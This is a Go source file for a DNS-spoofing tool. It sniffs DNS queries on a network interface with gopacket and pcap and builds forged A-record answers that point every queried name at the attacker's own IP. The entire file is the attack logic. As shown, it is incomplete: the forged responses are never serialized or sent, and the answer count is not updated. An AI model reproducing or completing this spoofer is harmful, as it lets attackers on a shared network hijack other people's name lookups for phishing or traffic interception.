package main

import (
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"net"
)

func getIfaceAddr(ifacename string) net.IP {

	// get the list of interfaces
	ifaces, err := net.Interfaces()
	if err != nil {
		panic(err)
	}

	// loop through them to get our local address
	for i := range ifaces {

		// check it's the interface we want
		if ifaces[i].Name != ifacename {
			continue
		}

		// get the addresses
		addrs, err := ifaces[i].Addrs()
		if err != nil {
			panic(err)
		}

		// check to ensure there is an address on this interface
		if len(addrs) < 1 {
			panic("No address on target interface")
		}

		// use the first available address
		ip, _, err := net.ParseCIDR(addrs[0].String())
		if err != nil {
			panic(err)
		}

		return ip

	}
	return nil
}

/*
Spoof is the entry point for the actual spoofing subroutine.

Spoof handles getting packets from the NICs, identifying DNS
queries, and seding responses. It is mostly concerened with
the packet level logic, and does not manipulate the responses
themselves
*/
func spoof(ifacename string) {

	// get our local ip
	ip := getIfaceAddr(ifacename)
	if ip == nil {
		panic("Unable to get IP")
	}

	// open a handle to the network card(s)
	handle, err := pcap.OpenLive(ifacename, 1600, true, pcap.BlockForever)
	if err != nil {
		panic(err)
	}

	// set the filter
	err = handle.SetBPFFilter("dst port 53")
	if err != nil {
		// not fatal
		fmt.Printf("Unable to set filter: %v\n", err.Error())
	}

	// get the channel source from the card
	pktSource := gopacket.NewPacketSource(handle, handle.LinkType())

	// pre-allocate all the space needed for the layers
	var ethLayer	layers.Ethernet
	var ipv4Layer	layers.IPv4
	var udpLayer	layers.UDP
	var dnsLayer	layers.DNS
	var a		layers.DNSResourceRecord

	// create the decoder for fast-packet decoding
	// (using the fast decoder takes about 10% the time of normal decoding)
	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)

	// this slick will hold the names of the layers successfully decoded
	decodedLayers := make([]gopacket.LayerType, 0, 4)

	// pre-create the response with most of the data filled out
	a.Type = layers.DNSTypeA
	a.Class = layers.DNSClassIN
	a.TTL = 300
	a.IP = ip

	// Main loop for dns packets intercepted
	for packet := range pktSource.Packets() {

		// decode this packet using the fast decoder
		err = decoder.DecodeLayers(packet.Data(), &decodedLayers)
		if err != nil {
			fmt.Println("Decoding error!")
			continue
		}

		// only proceed if all layers decoded
		if len(decodedLayers) != 4 {
			fmt.Println("Not enough layers!")
			continue
		}

		// check that this is not a response
		if dnsLayer.QR {
			continue;
		}

		// print the question section
		for i := uint16(0); i < dnsLayer.QDCount; i++ {
			fmt.Println(string(dnsLayer.Questions[i].Name))
		}

		// set this to be a response
		dnsLayer.QR = true

		// for each question
		for i := uint16(0); i < dnsLayer.QDCount; i++ {

			// get the question
			q := dnsLayer.Questions[i]

			// verify this is an A-IN record question
			if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
				continue;
			}

			// copy the name across to the response
			a.Name = q.Name

			// append the answer to the original query packet
			dnsLayer.Answers = append(dnsLayer.Answers, a)

		}
	}
}
